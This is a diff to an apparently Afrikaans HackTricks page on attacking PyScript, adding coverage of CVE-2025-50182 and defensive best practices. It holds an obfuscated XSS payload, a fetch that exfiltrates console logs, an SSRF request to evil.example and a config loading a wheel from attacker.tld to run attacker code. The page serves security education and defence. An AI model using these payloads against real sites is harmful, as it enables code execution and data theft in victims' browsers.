@@ -23,7 +23,7 @@ with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
 
 `CVE ID: CVE-2022-30286`\
 \
-Code:
+Kode:
 ```html
 <py-script>
 x = "CyberGuy" if x == "CyberGuy": with
@@ -47,7 +47,7 @@ body: JSON.stringify({ content: btoa(console.logs) }),
 ```
 ![](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)
 
-### Cross Site Scripting (Gewone) 
+### Cross Site Scripting (Gewone)
 
 Code:
 ```python
@@ -78,7 +78,7 @@ print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
 Kode:
 ```html
 <py-script>
-prinht("
+prinht(""
 <script>
 var _0x3675bf = _0x5cf5
 function _0x5cf5(_0xced4e9, _0x1ae724) {
@@ -140,7 +140,7 @@ return _0x34a15f
 return _0x599c()
 }
 </script>
-")
+"")
 </py-script>
 ```
 ![](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)
@@ -155,5 +155,63 @@ print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&
 </py-script>
 ```
 ![](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)
+
+---
+
+## Nuwe kwesbaarhede & tegnieke (2023-2025)
+
+### Server-Side Request Forgery via onbeheerde omleidings (CVE-2025-50182)
+
+`urllib3 < 2.5.0` ignoreer die `redirect` en `retries` parameters wanneer dit uitgevoer word **binne die Pyodide runtime** wat saam met PyScript verskaf word. Wanneer 'n aanvaller die teiken-URL's kan beïnvloed, kan hulle die Python-kode dwing om kruis-domein omleidings te volg, selfs wanneer die ontwikkelaar dit eksplisiet gedeaktiveer het ‑ wat effektief die anti-SSRF logika omseil.
+```html
+<script type="py">
+import urllib3
+http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
+r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
+print(r.status, r.url)
+</script>
+```
+Gepatch in `urllib3 2.5.0` – werk die pakket op in jou PyScript beeld of pin 'n veilige weergawe in `packages = ["urllib3>=2.5.0"]`. Sien die amptelike CVE-inskrywing vir besonderhede.
+
+### Arbitraire pakketlaai & voorsieningskettingaanvalle
+
+Aangesien PyScript arbitraire URL's in die `packages` lys toelaat, kan 'n kwaadwillige akteur wat konfigurasie kan wysig of inspuit **volledig arbitraire Python** in die slagoffer se blaaier uitvoer:
+```html
+<py-config>
+packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
+</py-config>
+<script type="py">
+import payload  # executes attacker-controlled code during installation
+</script>
+```
+*Net sui-Python-wiele is nodig – geen WebAssembly-kompilasietrede is nodig nie.* Maak seker dat konfigurasie nie deur die gebruiker beheer word nie en host vertroude wiele op jou eie domein met HTTPS & SRI-hashes.
+
+### Uitvoer sanitasie veranderinge (2023+)
+
+* `print()` steed rou HTML in en is dus XSS-gevoelig (voorbeelde hierbo).
+* Die nuwer `display()` helper **ontvlug HTML per standaard** – rou opmaak moet in `pyscript.HTML()` toegedraai word.
+```python
+from pyscript import display, HTML
+
+display("<b>escaped</b>")          # renders literally
+
+display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
+```
+Dit gedrag is in 2023 bekendgestel en is gedokumenteer in die amptelike Built-ins-gids. Vertrou op `display()` vir onbetroubare invoer en vermy om `print()` direk aan te roep.
+
+---
+
+## Verdedigende Beste Praktyke
+
+* **Hou pakkette op datum** – opgradeer na `urllib3 >= 2.5.0` en herbou gereeld wiele wat saam met die webwerf gestuur word.
+* **Beperk pakketbronne** – verwys slegs na PyPI-names of selfde-oorsprong URL's, idealiter beskerm met Sub-resource Integrity (SRI).
+* **Versterk Inhoudsekuriteitsbeleid** – verbied inline JavaScript (`script-src 'self' 'sha256-…'`) sodat ingeslote `<script>` blokke nie kan uitvoer nie.
+* **Verbied gebruiker-geleverde `<py-script>` / `<script type="py">` tags** – saniteer HTML op die bediener voordat dit teruggegee word aan ander gebruikers.
+* **Isoleer werkers** – as jy nie sinchroniese toegang tot die DOM van werkers nodig het nie, stel die `sync_main_only` vlag in om die `SharedArrayBuffer` kop vereistes te vermy.
+
+## Verwysings
+
+* [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
+* [PyScript Built-ins dokumentasie – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
 
 {{#include ../../banners/hacktricks-training.md}}
